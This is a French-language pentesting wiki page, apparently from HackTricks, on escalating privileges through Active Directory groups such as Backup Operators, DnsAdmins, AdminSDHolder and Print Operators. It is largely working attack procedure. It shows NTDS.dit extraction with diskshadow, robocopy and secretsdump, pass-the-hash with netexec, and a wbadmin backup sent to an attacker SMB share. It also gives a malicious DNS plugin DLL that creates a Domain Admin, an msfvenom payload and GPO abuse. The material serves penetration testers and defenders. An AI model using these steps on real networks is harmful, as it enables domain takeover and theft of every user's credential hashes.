# Groupes privilégiés

{{#include ../../banners/hacktricks-training.md}}

## Groupes connus disposant de privilèges d’administration

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ce groupe est autorisé à créer des comptes et des groupes qui ne sont pas des administrateurs sur le domaine. De plus, il permet la connexion locale au Domain Controller (DC).

Pour identifier les membres de ce groupe, la commande suivante est exécutée :
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
L’ajout de nouveaux utilisateurs est autorisé, tout comme la connexion locale au DC.<sup>[[1]](#references)</sup>

## Groupe AdminSDHolder

La **Access Control List** (ACL) du groupe **AdminSDHolder** est cruciale, car elle définit les autorisations pour tous les « groupes protégés » au sein d’Active Directory, y compris les groupes disposant de privilèges élevés. Ce mécanisme garantit la sécurité de ces groupes en empêchant les modifications non autorisées.

Un attaquant pourrait exploiter ce mécanisme en modifiant l’ACL du groupe **AdminSDHolder** afin d’accorder des autorisations complètes à un utilisateur standard. Cela donnerait effectivement à cet utilisateur le contrôle total de tous les groupes protégés. Si les autorisations de cet utilisateur sont modifiées ou supprimées, elles seraient automatiquement rétablies dans l’heure en raison de la conception du système.<sup>[[14]](#references)</sup>

La documentation récente de Windows Server considère toujours plusieurs groupes d’opérateurs intégrés comme des objets **protégés** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). Le processus **SDProp** s’exécute sur le **PDC Emulator** toutes les 60 minutes par défaut, définit `adminCount=1` et désactive l’héritage sur les objets protégés. Cela est utile à la fois pour la persistance et pour rechercher les utilisateurs privilégiés obsolètes qui ont été supprimés d’un groupe protégé, mais qui conservent toujours l’ACL sans héritage.<sup>[[12]](#references)</sup>

Les commandes permettant de consulter les membres et de modifier les autorisations sont les suivantes :
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Un script est disponible pour accélérer le processus de restauration : [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Pour plus de détails, consultez [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## Corbeille AD

L’appartenance à ce groupe permet de lire les objets Active Directory supprimés, ce qui peut révéler des informations sensibles :
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Ceci est utile pour **récupérer d’anciens chemins de privilèges**. Les objets supprimés peuvent toujours exposer `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, d’anciens SPN ou le DN d’un groupe privilégié supprimé, qui peut ensuite être restauré par un autre opérateur.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Accès au contrôleur de domaine

L’accès aux fichiers sur le DC est restreint, sauf si l’utilisateur appartient au groupe `Server Operators`, ce qui modifie le niveau d’accès.

### Élévation de privilèges

À l’aide de `PsService` ou de `sc` de Sysinternals, il est possible d’inspecter et de modifier les autorisations des services. Le groupe `Server Operators`, par exemple, dispose d’un contrôle total sur certains services, ce qui permet l’exécution de commandes arbitraires et l’élévation de privilèges :<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
Cette commande révèle que `Server Operators` disposent d'un accès complet, permettant de manipuler les services afin d'obtenir des privilèges élevés.

## Backup Operators

L'appartenance au groupe `Backup Operators` fournit un accès au système de fichiers de `DC01` grâce aux privilèges `SeBackup` et `SeRestore`. Ces privilèges permettent de parcourir les dossiers, d'en afficher le contenu et de copier des fichiers, même sans permissions explicites, en utilisant le flag `FILE_FLAG_BACKUP_SEMANTICS`. L'utilisation de scripts spécifiques est nécessaire pour ce processus.<sup>[[1]](#references)</sup>

Pour lister les membres du groupe, exécutez :
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Attaque locale

Pour exploiter ces privilèges localement, les étapes suivantes sont utilisées :

1. Importer les bibliothèques nécessaires :
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Activer et vérifier `SeBackupPrivilege` :
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Accéder aux fichiers de répertoires restreints et les copier, par exemple :
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Attaque AD

Un accès direct au système de fichiers du Contrôleur de domaine permet de voler la base de données `NTDS.dit`, qui contient tous les hashes NTLM des utilisateurs et des ordinateurs du domaine.

#### Utilisation de diskshadow.exe

1. Créer une copie miroir du lecteur `C` :
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copiez `NTDS.dit` depuis la shadow copy :
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Sinon, utilisez `robocopy` pour copier des fichiers :
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extraire `SYSTEM` et `SAM` pour récupérer les hashes :
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Récupérer tous les hashes depuis `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Après l’extraction : Pass-the-Hash vers DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Utilisation de wbadmin.exe

1. Configurez le système de fichiers NTFS pour le serveur SMB sur la machine de l’attaquant et mettez en cache les identifiants SMB sur la machine cible.
2. Utilisez `wbadmin.exe` pour effectuer une sauvegarde du système et extraire `NTDS.dit` :
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Pour une démonstration pratique, consultez [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Les membres du groupe **DnsAdmins** peuvent exploiter leurs privilèges pour charger une DLL arbitraire avec des privilèges SYSTEM sur un serveur DNS, souvent hébergé sur des Domain Controllers. Cette capacité offre un potentiel d’exploitation important.

Pour lister les membres du groupe DnsAdmins, utilisez :
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Exécuter une DLL arbitraire (CVE‑2021‑40469)

> [!NOTE]
> Cette vulnérabilité permet l’exécution de code arbitraire avec des privilèges SYSTEM dans le service DNS (généralement à l’intérieur des DC). Ce problème a été corrigé en 2021.

Les membres peuvent faire charger au serveur DNS une DLL arbitraire (localement ou depuis un partage distant) à l’aide de commandes telles que :
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Le redémarrage du service DNS (qui peut nécessiter des autorisations supplémentaires) est nécessaire pour que la DLL soit chargée :
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Pour plus de détails sur ce vecteur d’attaque, consultez ired.team.

#### Mimilib.dll

Il est également possible d’utiliser mimilib.dll pour l’exécution de commandes, en le modifiant afin d’exécuter des commandes spécifiques ou des reverse shells. [Consultez cet article](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) pour plus d’informations.<sup>[[15]](#references)</sup>

### Enregistrement WPAD pour le MitM

Les DnsAdmins peuvent manipuler les enregistrements DNS afin d’effectuer des attaques Man-in-the-Middle (MitM), en créant un enregistrement WPAD après avoir désactivé la liste de blocage globale des requêtes. Des outils comme Responder ou Inveigh peuvent être utilisés pour l’usurpation et la capture du trafic réseau.

### Lecteurs des journaux d’événements
Les membres peuvent accéder aux journaux d’événements et potentiellement y trouver des informations sensibles, telles que des mots de passe en clair ou des détails sur l’exécution de commandes :
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Ce groupe peut modifier les DACL sur l’objet de domaine, ce qui peut potentiellement accorder des privilèges DCSync. Les techniques d’escalade de privilèges exploitant ce groupe sont détaillées dans le dépôt GitHub Exchange-AD-Privesc.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Si vous pouvez agir en tant que membre de ce groupe, l’abus classique consiste à accorder à un principal contrôlé par l’attaquant les droits de réplication nécessaires à [DCSync](dcsync.md) :
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historiquement, **PrivExchange** enchaînait l'accès aux boîtes aux lettres, l'authentification Exchange forcée et le LDAP relay pour obtenir ce même primitive. Même lorsque cette voie de relay est atténuée, l'appartenance directe à `Exchange Windows Permissions` ou le contrôle d'un serveur Exchange reste une voie de grande valeur vers les droits de réplication du domaine.

## Hyper-V Administrators

Les membres de Hyper-V Administrators disposent d'un accès complet à Hyper-V, ce qui peut être exploité pour prendre le contrôle de Contrôleurs de domaine virtualisés. Cela inclut le clonage de DC actifs et l'extraction de hashes NTLM depuis le fichier NTDS.dit.

### Exemple d'exploitation

L'abus pratique consiste généralement à obtenir un **accès offline aux disques/checkpoints des DC**, plutôt qu'à utiliser d'anciennes techniques de LPE au niveau de l'hôte. Avec un accès à l'hôte Hyper-V, un opérateur peut créer un checkpoint ou exporter un Contrôleur de domaine virtualisé, monter le VHDX et extraire `NTDS.dit`, `SYSTEM` ainsi que d'autres secrets sans interagir avec LSASS à l'intérieur de la guest :
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Depuis là, réutilisez le workflow `Backup Operators` pour copier `Windows\NTDS\ntds.dit` ainsi que les ruches du registre hors ligne. Workflow associé pour les fichiers de sauvegarde :

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners

Ce groupe permet à ses membres de créer des Group Policies dans le domaine. Cependant, ses membres ne peuvent pas appliquer de group policies aux utilisateurs ou aux groupes, ni modifier les GPO existantes.

La nuance importante est que le **creator devient propriétaire de la nouvelle GPO** et obtient généralement suffisamment de droits pour la modifier ensuite. Cela signifie que ce groupe est intéressant lorsque vous pouvez :

- créer une GPO malveillante et convaincre un administrateur de la lier à une OU/domaine cible
- modifier une GPO que vous avez créée et qui est déjà liée à un emplacement utile
- abuser d’un autre droit délégué qui vous permet de lier des GPO, tandis que ce groupe vous donne les droits de modification

En pratique, l’abus consiste généralement à ajouter une **Immediate Task**, un **startup script**, une **local admin membership** ou une modification de **user rights assignment** via les fichiers de policy gérés par SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Si vous modifiez manuellement la GPO via `SYSVOL`, n'oubliez pas que cette modification ne suffit pas à elle seule : `versionNumber`, `GPT.ini` et parfois `gPCMachineExtensionNames` doivent également être mis à jour, sinon les clients ignoreront l'actualisation de la policy.<sup>[[9]](#references)</sup>

## Organization Management

Dans les environnements où **Microsoft Exchange** est déployé, un groupe spécial nommé **Organization Management** dispose de capacités importantes. Ce groupe possède les privilèges nécessaires pour **accéder aux boîtes aux lettres de tous les utilisateurs du domaine** et dispose d'un **contrôle total sur** l'unité organisationnelle (OU) **'Microsoft Exchange Security Groups'**. Ce contrôle inclut le groupe **`Exchange Windows Permissions`**, qui peut être exploité pour effectuer une privilege escalation.

### Exploitation des privilèges et commandes

#### Print Operators

Les membres du groupe **Print Operators** disposent de plusieurs privilèges, notamment **`SeLoadDriverPrivilege`**, qui leur permet de **se connecter localement à un Domain Controller**, de l'arrêter et de gérer les imprimantes. Pour exploiter ces privilèges, notamment si **`SeLoadDriverPrivilege`** n'est pas visible dans un contexte non élevé, il est nécessaire de contourner User Account Control (UAC).<sup>[[1]](#references)</sup>

Pour lister les membres de ce groupe, utilisez la commande PowerShell suivante :
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Sur les Domain Controllers, ce groupe est dangereux, car la stratégie par défaut des Domain Controllers accorde **`SeLoadDriverPrivilege`** à `Print Operators`. Si vous obtenez un token élevé pour un membre de ce groupe, vous pouvez activer le privilège et charger un driver signé, mais vulnérable, afin de passer au niveau kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Pour plus de détails sur la gestion des tokens, consultez [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Les membres de ce groupe disposent d'un accès aux PC via le Remote Desktop Protocol (RDP). Pour énumérer ces membres, des commandes PowerShell sont disponibles :
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Des informations supplémentaires sur l’exploitation de RDP sont disponibles dans des ressources dédiées au pentesting.

#### Utilisateurs de la gestion à distance

Les membres peuvent accéder aux PC via **Windows Remote Management (WinRM)**. L’énumération de ces membres s’effectue avec :
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Pour les techniques d’exploitation liées à **WinRM**, il convient de consulter la documentation spécifique.

#### Server Operators

Ce groupe dispose des permissions nécessaires pour effectuer diverses configurations sur les contrôleurs de domaine, notamment les privilèges de sauvegarde et de restauration, la modification de l’heure système et l’arrêt du système.<sup>[[1]](#references)</sup> Pour énumérer ses membres, la commande fournie est :
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Sur les contrôleurs de domaine, `Server Operators` héritent généralement de suffisamment de droits pour **reconfigurer ou démarrer/arrêter des services** et reçoivent également `SeBackupPrivilege`/`SeRestorePrivilege` via la stratégie par défaut des contrôleurs de domaine. En pratique, cela en fait un pont entre **l’abus du contrôle des services** et **l’extraction de NTDS** :
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Si une ACL de service donne à ce groupe les droits de modification/de démarrage, indiquez au service une commande arbitraire, démarrez-le en tant que `LocalSystem`, puis restaurez le `binPath` d’origine. Si le contrôle des services est verrouillé, utilisez les techniques de `Backup Operators` ci-dessus pour copier `NTDS.dit`.

## References

- [1] [ired.team – Comptes privilégiés et privilèges de Token](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Abus de SeLoadDriverPrivilege pour l’élévation de privilèges](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Abus des permissions GPO](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Abus des GPO, partie 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Guide du Red Teamer sur les GPO et les OU](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Fonction ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — LDAP anonyme → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Annexe C : comptes et groupes protégés dans Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Comment abuser d’AdminSDHolder et le backdoorer pour obtenir une persistance de Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Abus du privilège DnsAdmins pour l’élévation dans Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Informations sur l’abus de l’arête GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Fonction NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
